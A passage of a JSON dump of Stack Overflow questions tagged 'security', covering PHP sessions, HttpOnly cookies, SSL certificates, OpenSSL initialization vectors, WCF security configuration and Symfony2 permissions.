Facebook.com inside some other website using CURL</p>\n"},{"tags":["php","javascript","mysql","ajax","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12509037,"title":"Safely execute queries via AJAX on document ready","body":"<p>Greeting everybody,</p>\n\n<p>My problem is like this: I have some custom made statistics on my internet site where I log informations on what users do ( google analytics - like ). Obviously I aggregate information a couple of months, but the Tables I store information have grown too large and have a negative impact on page loading. The flow is like this ( in index, so affect all pages ) :</p>\n\n<pre><code>1. Get the included files\n2. Execute part of statistics queries\n3. Effective page code\n4. Execute the last part of statistics queries\n</code></pre>\n\n<p>To get rid of this problem I want to make those queries on <code>&lt;body onload=\"execQueries();\"&gt;</code> or on document ready with javascript / AJAX.</p>\n\n<p>How can I safely and securely make those queries using AJAX, so that cannot be abused by a client with good knowledge of javascript/ajax. Because if I simply make that JS function it can be accesed everytime by a user with firebug.</p>\n\n<p>The solution I think about is including the use of <code>$_SESSION</code> where I mark in top of my index.php information about those queries ( id, info ) and in the script called by AJAX I check if that <code>$_SESSION['query_info']</code> is set and I execute it reading all the info from there, and then I use <code>unset($_SESSION['query_info']);</code>. So, if the AJAX is called again, because tat specific <code>$_SESSION['query_info']</code> does not exists, I do not do anything in my DB.</p>\n\n<p>Do you think this is a secure solution or do you have other ideas? Anything viable is welcomed.</p>\n\n<p>Thank you</p>\n"},{"tags":["java","security","jsp","jsessionid","httponly"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":776,"score":3,"question_id":9835019,"title":"Missing HttpOnly Attribute in Session Cookie","body":"<p>in <code>sign.jsp</code>, I have written the following so that, if a user is already logged in then immediately he would be forwarded to his <code>home page</code></p>\n\n<pre><code>&lt;%\ntry{\n\nHttpSession session1 = request.getSession(false);\n\nif(session1.getAttribute(\"authenticated\")!=null &amp;&amp;  \n session1.getAttribute(\"authenticated\").equals(true))\n{\nresponse.sendRedirect(\"userhome.jsp\");\n}\nelse{\n\n// users have to login here\n}\n%&gt;\n</code></pre>\n\n<p>Security scan is telling that <code>Missing HttpOnly Attribute in Session Cookie</code> in <code>sign.jsp</code>.</p>\n\n<p>If i will set:  <code>&lt;Context useHttpOnly=\"true\"&gt;\n                    ...\n                &lt;/Context&gt;</code></p>\n\n<p>in : <code>C:\\Program Files\\Apache Software Foundation\\Apache Tomcat 6.0.20\\conf</code></p>\n\n<p>then will my problem be solved or what else i have to do? Any suggestion is much appreciated</p>\n"},{"tags":["security","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12502779,"title":"CAPICOM dll not working in x64 bit server","body":"<p>I am using CAPICOM dll in my project for certificate generation. \nOn my local machine that is 32 bit sysatem it is working fine but on server where I host my application that is 64 bit server machine it gives 0x80090020 error.</p>\n\n<p>As my local machine I register CAPICOM.dll with regsvr32 CAPICOM.dll command in system32 folder and also register the CAPICOM.dll with regsvr32 CAPICOM.dll command in system32 and syswow64 both folders. Message appears that dll registered successfully.</p>\n\n<p>When I run my application then it will gives the 0x80090020 error. this error means is \"Internal Server Error\".</p>\n\n<p>Please give me reply if there is some way to resolve this error. I don't want to use the other alternatives of CAPICOM.dll.</p>\n\n<p>Please give me solution ASAP I have spent lots of time but not getting any solution.\nThanks in advanced.</p>\n"},{"tags":["security","passwords","solaris"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12472469,"title":"Solaris (SPARC) password storing solution","body":"<p>I'm desperately looking for a tool to store lots of server passwords and hostnames.\nThis shouldn't be too difficult but my requirements demand that the tool has to run on a solaris sparc 64 server and it should be possible to define some kind of access control to limit the access for some users.\nThe best solution would be password groups that only specified users can access because my company doesn't want to create multiple databases and store all the passwords in a single one.</p>\n\n<p>Edit: I already tested most of the popular tools like keepassx or fpm2 but my problem is the management of the group access. All passwords have to be in a single database but not all users should be able to see e.g. sysadmin passwords.\nMaybe someone worked with a less popular or homemade tool to manage their server passwords...</p>\n\n<p>At this point I'd enjoy any kind of input of other company side solutions - how you solved your password problems.\nI really appreciate any kind of help I've been stuck on this topic for a long time..</p>\n\n<p>Thanks a lot</p>\n"},{"tags":["security","symfony2"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1171,"score":0,"question_id":7311909,"title":"More Than 32 Roles/Permissions Symfony2 Security System?","body":"<p>Everything in Symfony2 looks pretty good however there is one issue I can't seem to find a solution too.  The issue is that Symfony2's security component is limited to 30-32 roles/permissions.  One of my projects, a project management/issue tracker system, is going to need more than 32 permissions.  There are a number of different components of the system that need to have there own set of permissions.  Just because someone has create, read, update, or delete permissions to issues does not mean they have those permissions for projects, milestones, etc...  Each component is going to need its own create, read, update, and delete permission not to mention component specific permissions and there is no doubt I will reach the 30-32 roles/permission limit.</p>\n\n<p>I have questioned in IRC and the mailing list with no really direction of where to go.  I would prefer to be able to just added this functionality on top of the existing security component (preferably through a bundle).  I am not sure how I can achieve more than 30-32 roles/permissions with symfony2's security component.</p>\n\n<p>I would really prefer not to have to development my own security system w/ ACL.</p>\n"},{"tags":["javascript","jquery","security","cross-domain","opera"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":136,"score":3,"question_id":12486960,"title":"How can I make cross-domain requests to a local server from an external page in Opera?","body":"<p>I have a system that's responsible for distributing jobs to a group of browsers running on different machines. Each browser reloads a page waiting for jobs to come in.</p>\n\n<p>One thing each job does is to make a cross-domain JSONP request to a local server running on the local machine in order to get some information from the system. This works in every browser I've tried except for Opera.</p>\n\n<p>Here's the jQuery code that I'm using to make the request:</p>\n\n<pre><code>$.ajax({\n  url: \"http://10.20.30.40:8000/...\",\n  dataType: \"jsonp\",\n  data: someData\n  success: function(data) { ... }\n});\n</code></pre>\n\n<p>The <code>10.20.30.40</code> host is the local IP address, identifying a local server running on the machine with the browser. The page which is making this request is loaded from a domain name like <code>blah.internal.example.com</code> which is visible to all the machines inside our network.</p>\n\n<p>The first such request made from Opera (I'm using 12.02) succeeds. However, subsequent requests made in the same way are never actually made. They don't show up in the network tab of the inspector. In the console, a message is displayed saying <code>Linked script not loaded</code>.</p>\n\n<p>I believe that this message (and the lack of a request) is triggered by Opera's Cross-Network Security, which is described in <a href=\"http://my.opera.com/securitygroup/blog/2012/07/03/operas-cross-network-protection\" rel=\"nofollow\">this blog post</a>. On Stackexchange, <a href=\"http://stackoverflow.com/questions/5464599/opera-wont-load-some-javascript-files/7442998#7442998\">this answer</a> suggests a workaround, but it requires user interaction. For my use case, the browsers are started, stopped, and run by a script, so user interaction isn't an option.</p>\n\n<p>Is there a way to disable this cross-network security in Opera completely, or for pages loaded from a particular \"trusted\" host? I need a change that I can make in the preferences or <code>opera:config</code> that will be sticky across sessions. (All of these computers are running on an internal network on internally controlled pages, so I'm not worried about cross-network attacks.)</p>\n"},{"tags":["java","security","applet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12507850,"title":"Client-server security comunication","body":"<p>I'm developing a java applet that will communicate with my application server (php-mysql) ...</p>\n\n<p>the end-user that will use the applet will enter inputs that will be communicated to the server (throught POST or with ajax)</p>\n\n<p>Is very important that nobody can manipulate data that will be sent to the server ... the problem is that Java applets can be decompiled...</p>\n\n<p>there is a way (algorithm) to be inserted in the application server to make sure that, even if the java is decompiled and the 'hacker' will be able to understand how it works, the application php will be able to understand whether the input data coming from the applet are authentic and not manipulated data?</p>\n\n<p>this is an hard thing because all code i will add to the java applet can be viewed by everyone (because java *.class file can be read)</p>\n\n<p>crypt data is useless because the applet have to decrypt it and so it has to know the password...</p>\n\n<p>It is like black-box and white-box problem... no-one can open the black-box (the server script), but everyone can open the white-box (java applet)</p>\n"},{"tags":["internet-explorer","https","security"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3277,"score":1,"question_id":1601898,"title":"How do I view the insecure items on a secure page","body":"<p>I have a web application which works perfectly fine on my own machines, perfectly fine on my customer's PCs but on their customers machines each page they visit they get a prompt for the Mixed Content coming up.</p>\n\n<p>However it doesn't matter whether they answer yes or no to the question, they still get all of the functionality of the site.</p>\n\n<p>We cannot ask them to disable the warning, since they would then consider our application not secure and not use it.</p>\n\n<p>I've installed Httpwatch and none of the resources or urls being loaded are insecure.\nThe codebase for any flash objects is called using https:\nI've checked for any removechild() function calls in the scripts and none of them are called on divs with a background image.\nWe have no calls to javascript:void anywhere in the codebase.</p>\n\n<p>I'm at a loss as to what to check next.\nIs there any way without being too intrusive, to find out what insecure objects the page is trying to load?\nThis has to be something that will work on IE7 or 8 as we are not allowed to install anything on their machines.</p>\n"},{"tags":["security","windows-7","windows-applications","windows-scheduler","windows-xp-professional"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12491364,"title":"How to run Application.exe befor windows startup?","body":"<p>I have a windows application with user Interface that do some stuff...\nNow my client wants that,when he pushes the power button MyApplication run before he forced to input the username and password!!!!\ncomment:  the system is multi user on windows XP or Seven.</p>\n\n<p>Is it possible anyway?</p>\n"},{"tags":["security","google-chrome","web-inspector"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12500725,"title":"Changing HTML in Google Inspector","body":"<p>I know it's very possible to open up Google Inspect Element and change the HTML, CSS, or whatever for any given site.</p>\n\n<p>My question though, is couldn't this really be a security threat? Or at least a threat to the integrity of your website. Say you had a website done in PHP, and in a script you were expecting POST from a form, however someone opened up your site in Inspect Element, and changed the form to GET. Your site wouldn't function properly, correct?</p>\n\n<p>I have to imagine some hacker-savy hooligan could do some damage with this, could they not? I am not hack-savy myself so I don't know what they could do, but I have to imagine the worst.</p>\n\n<p>So is this yet another thing we should consider when developing websites? How people may alter the HTML? I mean, I understand the need to like strip tags and all that to protect your site from malicious user input, but having to worry about how they could actually change the site right in front of their eyes is a bit ridiculous.</p>\n\n<p>Thoughts?</p>\n"},{"tags":["php","security","session","data","hacking"],"answer_count":5,"favorite_count":9,"up_vote_count":18,"down_vote_count":0,"view_count":656,"score":18,"question_id":3224286,"title":"What are the risks of PHP sessions?","body":"<p><strong>So everyone says that sessions have security risks, I want to know what kind of risks are these? What can hackers do with sessions?</strong> </p>\n\n<p>This is not about knowing how to avoid attacks, I want to know how hackers are doing it, and what are they doing.</p>\n\n<p>I talk about <code>PHP SESSIONS</code>. </p>\n"},{"tags":["actionscript-3","flex","security","application","sandbox"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12501575,"title":"Security differences between Flex Application class and \"normal\" application","body":"<p>I have a problematic piece of code that uses Wordnik API to fetch word definitions. This code works fine in \"local trusted\" security sandbox, but doesn't work online - it produces a \"security sandbox violation\" (but no common ways of solving sandbox violation helped).</p>\n\n<p>I've consulted this with Wordnik API creators and they didn't solve my problem directly but pointed me to a working example. Indeed their example works, but it uses Flex class \"Application\".</p>\n\n<p>Same code that doesn't work in a standalone .as class, does work when used in Flex Application.</p>\n\n<p>My question is: what are the differences (especially security differences) between Flex Application class and normal AS3 class extending Sprite?</p>\n\n<p>I'm using Flashdevelop to compile. That can be important as Wordnik guys said that it worked fine in Flash Builder - although they didn't provide the details and I couldn't reproduce it.</p>\n\n<p>I can attach the code if it is needed.</p>\n"},{"tags":["security","api","rest","authentication","bicommerce"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12499516,"title":"Application design for unusual(?) authentication scheme","body":"<p>I'm at an ecommmerce startup using BigCommerce, the software has its pros and cons.  I'm looking at writing a companion back-office application that would be hosted on the same domain that would bridge some functional gaps in the platform.  BigCommerce has a pretty good restful API and building should be pretty easy- their authentication scheme is something I haven't seen before:</p>\n\n<ol>\n<li>BigCommerce has users with usernames and passwords</li>\n<li>Users also have API keys associated with application permissions</li>\n</ol>\n\n<p>To access the API, REST requests are submitted with a form value:</p>\n\n<ul>\n<li>Authorization = basic [hashed auth token]</li>\n<li>where <code>hashed auth token</code> is a base 64 encoded string of username + api key</li>\n</ul>\n\n<p>It seems to me like the only way to authenticate users for the companion app is to require their BigCommerce name and API key.  I either have to store the user's API key as part of a user object in the companion app with it's own password, or require the user to enter it each time.  </p>\n\n<p>I'm leaning towards the former, but this is the first time I've written something like this.  Is this a standard design?</p>\n"}]}
{"total":17772,"page":14,"pagesize":100,"questions":[{"tags":["ios","security","cakephp","ssl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12500903,"title":"Extremely new to security. How do I add SSL to my web app?","body":"<p>Having a hard time finding what I'm looking for, so turning to SO.</p>\n\n<p>I just \"inherited\" (someone else quit.. now it's me) an iOS app that makes calls to a private CakePHP JSON API.  Currently, the login action is not secure -- we're just sending plain text over the wire (bad, obviously).</p>\n\n<p>I'm developing it locally using a basic MAMP setup, and it is deployed to Amazon EC2, using the Amazon Linux AMI.  </p>\n\n<p>I'm completely new to server setup/configuration, so I'm not sure where to start.  All my past web dev jobs have had auto-magic security, implemented by some other guy :)  I understand you can create self-signed SSL certs, and I believe that should be sufficient for our needs, because this API will never be publicly available.</p>\n\n<p>1) How do I make a cert?</p>\n\n<p>2) Where do I \"put\" the cert? (both for local development and production deployment)</p>\n\n<p>3) Do I do anything different on the client side, or just direct requests to \"https://\" instead of \"http://\"?</p>\n\n<p>Answers to one or all of these questions would be extremely, extremely helpful.</p>\n\n<p>My development machine is OSX, if that matters.</p>\n"},{"tags":["security","xacml"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12499920,"title":"XACML Target Evaluvation","body":"<p>How does Target evaluates when we have multiple Subject tags under Subjects tag?</p>\n"},{"tags":["security","validation","logic","anti-hacking","login-system"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12497976,"title":"What is the logic behind a secure login-system?","body":"<p>I'm really sorry if this question has nothing to do on this site, but I thought since there's alot of great minds here.\nIn the near future I'm going to create a program where users will have their own accounts, so I've started to think about the security, which is why I have to ask since there's a few aspects that I thought about and I'm extremely concerned.</p>\n\n<ul>\n<li><p>Obviously, I shouldn't store cleartext passwords in my database, the program that the user will send their information from will encrypt it, is it this encrypted password that I store, or should the server encrypt it again and store that one instead? Or some other solution.</p></li>\n<li><p>When validating, should I simply compare the encrypted password that I got with the one stored or should there be some decryption going on?</p></li>\n</ul>\n\n<p>That pretty much covers my wonderings about how I should handle passwords, but I have a problem with the potential problem of hackers.</p>\n\n<ul>\n<li><p>Is it possible for a person to intercept any traffic going on in the world, or only the local network?</p></li>\n<li><p>Let's say a hacker get a hold of all packages beeing sent to the server, the password is encrypted so there is no way he can get the cleartext password, but wouldn't it be possible to resend the packages and thereby tricking the servers to login the hacker?</p></li>\n</ul>\n\n<p>If the answer to the last question is yes, in my mind there's no way of keeping things secure no matter how good you encrypt it since the data is still useful.</p>\n\n<p>Someone that know how things work? Maybe work as a security administrator (or such) that can tell how they do it in your company (of course don't reveal sensitive information!)? I don't ask for encryption methods, but for the logic behind keeping things secure from unauthorized people.</p>\n\n<p><strong>* EDIT *</strong>\nI actually found how to process and store passwords, so that's no longer a problem. I'm still curious about resending packages though.</p>\n"},{"tags":["c#","javascript","jquery","security","integrity"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":46,"score":3,"question_id":12492554,"title":"Checking integrity of javascript, user code=server code","body":"<p>Is there a way to verify that the user changed the jQuery/JavaScript with Firebug during the use of client-side page?</p>\n"},{"tags":["wcf","security","iis","x509certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12498389,"title":"Cert issue setting up WCF in IIS","body":"<p>I'm setting up my WCF service on a development IIS6 instance and am experiencing issues. When I browse to the service, I get a 403.7 - Forbidden: SSL client certificate is required. Not sure if this is an error thrown by IIS or the WCF service.</p>\n\n<p>Here's what I've done so far. Created a cert with the pluralsight <a href=\"http://blog.pluralsight.com/2012/02/13/selfcert-create-a-self-signed-certificate-interactively-gui-or-programmatically-in-net/\" rel=\"nofollow\">selfcert</a> util. and referenced it in my config of the WCF service as below:</p>\n\n<pre><code>&lt;services&gt;\n            &lt;service behaviorConfiguration=\"UsernamePasswordBehavior\" name=\"DataServices.BEService\"&gt;                \n                &lt;endpoint address=\"ws\" binding=\"wsHttpBinding\" bindingConfiguration=\"wsHttpWithUsernamePassword\" name=\"BEwsHttp\" contract=\"DataServices.IBEService\" /&gt;\n               &lt;host&gt;\n                    &lt;baseAddresses&gt;\n                        &lt;add baseAddress=\"http://dataservices.server1.com/BE\" /&gt;\n                    &lt;/baseAddresses&gt;\n                &lt;/host&gt;\n            &lt;/service&gt;\n&lt;/services&gt;\n\n&lt;behaviors&gt;\n            &lt;serviceBehaviors&gt;\n                &lt;behavior name=\"UsernamePasswordBehavior\"&gt;\n                    &lt;serviceMetadata httpGetEnabled=\"true\"/&gt;\n                    &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;                    \n                    &lt;serviceCredentials&gt;\n                        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\" customUserNamePasswordValidatorType=\"DataServices.CustomUsernameValidator, DataServices\" /&gt;\n                        &lt;serviceCertificate findValue=\"ddksdev1.server1.com\" storeLocation=\"LocalMachine\" storeName=\"TrustedPeople\"  x509FindType=\"FindBySubjectName\"/&gt;                        \n                    &lt;/serviceCredentials&gt;                    \n                &lt;/behavior&gt;\n            &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n\n&lt;bindings&gt;\n            &lt;wsHttpBinding&gt;\n                &lt;binding name=\"wsHttpWithUsernamePassword\" sendTimeout=\"00:06:00\"  receiveTimeout=\"00:06:00\"&gt;\n                    &lt;security mode=\"Message\"&gt;\n                        &lt;message clientCredentialType=\"UserName\"/&gt;\n                    &lt;/security&gt;                    \n                &lt;/binding&gt;\n            &lt;/wsHttpBinding&gt;\n&lt;/bindings&gt;\n</code></pre>\n\n<p>Then, I imported the cert into IIS. I even registered it into certmgr.msc but am not sure if that's necessary if the cert is in IIS. It seems either I missed a step or I'm not referencing it right in the config (likely in the storelocation or storename). </p>\n\n<p>Edit: The service runs when ran from the WCF Test Client so it seems more like an IIS config issue.</p>\n"},{"tags":["security","url","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":57,"score":3,"question_id":12479398,"title":"How can I generate a \"private URL\" with state of the art balance between security and convenience?","body":"<p>Where can I find a well-written, in-depth technical discussion about \"private URLs\" like the ones used in Google Docs' \"anyone with the link\" <a href=\"http://support.google.com/drive/bin/answer.py?hl=en&amp;answer=2494886&amp;p=visibility_options\" rel=\"nofollow\">sharing setting</a>? I'm looking for topics like the algorithm and implementation for generating a link, the size of the ID space it uses, analysis of the security implications, and pragmatic compromises in security for convenience. I want to avoid reading dogma about \"security through obscurity\".</p>\n\n<p>I found one <a href=\"http://stackoverflow.com/questions/4833314/are-secret-urls-truly-secure\">loosely related Stack Overflow question</a>, but it doesn't treat the topic in much depth, and the answers are more dogmatic and less pragmatic than I'd like.</p>\n\n<p>I searched Google Scholar for <a href=\"http://scholar.google.com/scholar?hl=en&amp;q=%22anyone+with+the+link%22&amp;btnG=&amp;as_sdt=1%2C22&amp;as_sdtp=\" rel=\"nofollow\">\"anyone with the link\"</a>, <a href=\"http://scholar.google.com/scholar?as_ylo=2008&amp;q=%22secret+url%22&amp;hl=en&amp;as_sdt=0,22\" rel=\"nofollow\">\"secret URL\"</a>, and <a href=\"http://scholar.google.com/scholar?start=10&amp;q=private+url&amp;hl=en&amp;as_sdt=0,22\" rel=\"nofollow\">\"private URL\"</a>. I found a few interesting papers and patents, but I'm still interested to learn more about what the state of the art is.[<a href=\"http://scholar.googleusercontent.com/scholar?q=cache%3aOhoYbR3facwJ%3ascholar.google.com/&amp;hl=en&amp;as_sdt=0,22&amp;as_ylo=2008\" rel=\"nofollow\">1</a>] [<a href=\"https://lirias.kuleuven.be/bitstream/123456789/272355/1/CW585.pdf\" rel=\"nofollow\">2</a>] [<a href=\"http://www.google.com/patents/US6360254\" rel=\"nofollow\">3</a>] [<a href=\"http://www.google.com/patents/US6718328\" rel=\"nofollow\">4</a>] [<a href=\"http://www.google.com/patents/US6529956\" rel=\"nofollow\">5</a>]</p>\n"},{"tags":["security","rest","jersey"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12481539,"title":"secure a rest web service using jersey","body":"<p>I have implemented rest web services for my application. Since this should not be a public service ,I want to enforce some type of client authentication. Please throw light on how to do that.</p>\n\n<p>FYI, I am using apache Tomcat 7 and a MYSQL database</p>\n"},{"tags":["security","captcha","ddos","anti-hacking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12465056,"title":"When to Ask Captcha Rules?","body":"<p>While there is a lot of discussion about Captcha implementation, I couldn't find any details on what circumstances one should ask for Captcha especially for a financial app serving consumers.</p>\n\n<p>Some of the rules I think of:</p>\n\n<ol>\n<li>If 3 failed login/registrations attempts</li>\n<li>If 3 duplicate calls if user already logged in.</li>\n</ol>\n\n<p>I believe these rules are driven through security risk and is there a better way to manage this? Any library, which helps to solve this problem?</p>\n"},{"tags":["php","security","openssl"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":242,"score":4,"question_id":11821195,"title":"Use of Initialization Vector in openssl_encrypt","body":"<p>I had a look at <a href=\"http://stackoverflow.com/questions/1391132/two-way-encryption-in-php\">this</a> question, and wanted to do it for myself. When I ran this code (taken straight from <a href=\"http://stackoverflow.com/a/6639179/962144\">this answer</a>):</p>\n\n<pre><code>$textToEncrypt = \"My super secret information.\";\n$encryptionMethod = \"AES-256-CBC\";  // AES is used by the U.S. gov't to encrypt top secret documents.\n$secretHash = \"25c6c7ff35b9979b151f2136cd13b0ff\";\n\n//To encrypt\n$encryptedMessage = openssl_encrypt($textToEncrypt, $encryptionMethod, $secretHash, '1234567812345678');\n\n//To Decrypt\n$decryptedMessage = openssl_decrypt($encryptedMessage, $encryptionMethod, $secretHash);\n\n//Result\necho \"Encrypted: $encryptedMessage &lt;br&gt;Decrypted: $decryptedMessage\";\n</code></pre>\n\n<p>However I get the warning</p>\n\n<pre><code>openssl_encrypt(): Using an empty Initialization Vector (iv) is potentially insecure and not recommended\n</code></pre>\n\n<p>So I went and had a look at the <a href=\"http://www.php.net/manual/en/function.openssl-encrypt.php\" rel=\"nofollow\">docs</a>, but there 'is no documentation'. I found this <a href=\"http://www.php.net/manual/en/function.openssl-encrypt.php#99188\" rel=\"nofollow\">comment</a>, but still no mention of what the Initialization Vector should be and how I should use it. Can anyone enlighten me?</p>\n\n<p>I know I could have done some more Googleing, but Stackoverflow comes up first in so many search results I thought this question might be useful to anyone else who was having this problem.</p>\n\n<p>Thanks in advance! </p>\n"},{"tags":["security","spring","authentication","login"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":370,"score":0,"question_id":8609722,"title":"spring security authentication required page","body":"<p>I use Spring Security 3.0.7</p>\n\n<p>I have a web security rule in the config file to allow the access to some pages just to authenticated users:</p>\n\n<pre><code>&lt;intercept-url pattern=\"/faces/paginas/secured/**\" access=\"isAuthenticated()\"/&gt;\n</code></pre>\n\n<p>When an anonymous user tries to access any of those pages, the login form is rendered, in order to enter the usename and password.</p>\n\n<p>This is the default behaviour.</p>\n\n<p>But is there any way to render a custom page instead of the login form? (for example, a page just showing a message like \"Access denied\")</p>\n"},{"tags":["security","api","rest","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":133,"score":0,"question_id":11966597,"title":"How to protect APIs under two different firewalls on Symfony2","body":"<p>I'm currently developing a new set of Restfull APIs on Symfony2.1, and they are for the moment under no firewall in my security.yml</p>\n\n<pre><code>    api:\n        pattern: ^/api\n        security: false\n</code></pre>\n\n<p>I have a <code>RequestListener</code> that \"protect\" them by checking if users give an Auth token or use Basic Auth. After correct login, we populate the security context with the user. (Maybe we could even make a firewall of that using a Factory?)</p>\n\n<p>This works perfectly for external devs / organisations who want to use our API in their apps.</p>\n\n<p>Now, I'd like us to rely on these same APIs inside our project (controllers, ajax calls..) and I was wondering now if we have to implement ourselves the API get-token or Basic Auth process to populate the security context of the API or if they could, in a way or another, retrieve magically the current security context of the main firewall. (it would save me the embarrassment of geting a token, saving it somewhere and passing it through my Backbonejs ajax calls all the way in my views).</p>\n\n<p>Thanks for your thoughts on that! :)</p>\n"},{"tags":["security","authentication","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":172,"score":0,"question_id":11118013,"title":"Authentication using Symfony 2.1-dev (Wrong credentials)","body":"<p>I'm using Symfony 2.1-dev and am having problems when authenticate users using a form.</p>\n\n<p><a href=\"https://gist.github.com/2959325\" rel=\"nofollow\">First of all my code</a></p>\n\n<p>The problem:<br>\nWhen authenticating I get \"Wrong credentials\" error.<br>\nI put some logging into the entity and as the logged string does not show up I suppose that the entity is not being used.<br>\nAnyway, the log shows that a query is being made to the correct table.<br></p>\n\n<p>What can I be missing?</p>\n\n<p>Thanks in advance for any help</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>I now managed to find out that the problem is the password.<br>\nFor some reason it seems that when encoding the password from the fixtures, these get shortened to 60 chars, while when authenticating the length of the resulting string is 88 chars.<br>\nWhy could that be?</p>\n"},{"tags":["c#","security","process","config","launch"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12494660,"title":"Security of launching files from program","body":"<p>I have a launcher app which lets the user select <code>exe</code> files they want to open quickly. To do this, they select the file from a File Browser, and I store the exe path in a config file. Is there a security problem with this? My concern is that some malware could alter the config file to change the exe file to a malicious executable and the app would then launch it. Is this a viable threat, or is it the case that if the malware can rewrite a file, it wouldn't need a proxy app to launch another file? I could encrypt the file, but I don't mind the user manually altering the settings via a text editor.</p>\n"},{"tags":[".net","wcf","security"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12489481,"title":"How do I set up WCF security between client and server that I control?","body":"<p>I have a windows service that is hosting a WCF service and a WPF application that communicates with it.  The WPF application will be on a different machine on the same network.  I am having trouble with setting up security between the two when sending WCf messages.  Here are the Server and Client app.config files:</p>\n\n<p>Server</p>\n\n<pre><code>    &lt;?xml version=\"1.0\"?&gt;\n    &lt;configuration&gt;\n      &lt;system.serviceModel&gt;\n        &lt;services&gt;\n      &lt;service behaviorConfiguration=\"WCFBehavior\" name=\"WCF.WCFService\"&gt;\n        &lt;endpoint address=\"\" binding=\"netTcpBinding\" bindingConfiguration=\"\"\n          name=\"NetTcpBindingEndpoint\" contract=\"WCF.IWCFService\"&gt;\n          &lt;identity&gt;\n            &lt;dns value=\"localhost\" /&gt;\n          &lt;/identity&gt;\n        &lt;/endpoint&gt;\n        &lt;endpoint address=\"mex\" binding=\"mexTcpBinding\" bindingConfiguration=\"\"\n          name=\"MexTcpBindingEndpoint\" contract=\"IMetadataExchange\" /&gt;\n        &lt;host&gt;\n          &lt;baseAddresses&gt;\n            &lt;add baseAddress=\"net.tcp://localhost:8731/WCFService/\" /&gt;\n          &lt;/baseAddresses&gt;\n        &lt;/host&gt;\n      &lt;/service&gt;\n    &lt;/services&gt;\n    &lt;behaviors&gt;\n      &lt;endpointBehaviors&gt;\n        &lt;behavior name=\"WebHttp\"&gt;\n          &lt;webHttp /&gt;\n        &lt;/behavior&gt;\n      &lt;/endpointBehaviors&gt;\n      &lt;serviceBehaviors&gt;\n        &lt;behavior name=\"WCFBehavior\"&gt;\n          &lt;serviceMetadata httpGetEnabled=\"false\" /&gt;\n          &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n          &lt;dataContractSerializer maxItemsInObjectGraph=\"2147483647\" /&gt;\n          &lt;serviceTimeouts transactionTimeout=\"05:05:00\" /&gt;\n          &lt;serviceThrottling maxConcurrentCalls=\"500\" maxConcurrentSessions=\"500\"\n            maxConcurrentInstances=\"2147483647\" /&gt;\n        &lt;/behavior&gt;\n      &lt;/serviceBehaviors&gt;\n    &lt;/behaviors&gt;\n    &lt;bindings&gt;\n      &lt;wsDualHttpBinding&gt;\n        &lt;binding name=\"WCFBinding\"&gt;\n          &lt;security mode=\"None\"&gt;\n          &lt;/security&gt;\n        &lt;/binding&gt;\n      &lt;/wsDualHttpBinding&gt;\n      &lt;webHttpBinding&gt;\n        &lt;binding name=\"webHttpBindingWithJsonP\" crossDomainScriptAccessEnabled=\"true\" /&gt;\n      &lt;/webHttpBinding&gt;\n    &lt;/bindings&gt;\n  &lt;/system.serviceModel&gt;\n  &lt;startup&gt;\n    &lt;supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.0\"/&gt;\n  &lt;/startup&gt;\n  &lt;runtime&gt;\n    &lt;assemblyBinding xmlns=\"urn:schemas-microsoft-com:asm.v1\"&gt;\n      &lt;probing privatePath=\"lib\" /&gt;\n    &lt;/assemblyBinding&gt;\n  &lt;/runtime&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Client</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;configuration&gt;\n  &lt;startup&gt;\n    &lt;supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.0\"/&gt;\n  &lt;/startup&gt;\n  &lt;runtime&gt;\n    &lt;assemblyBinding 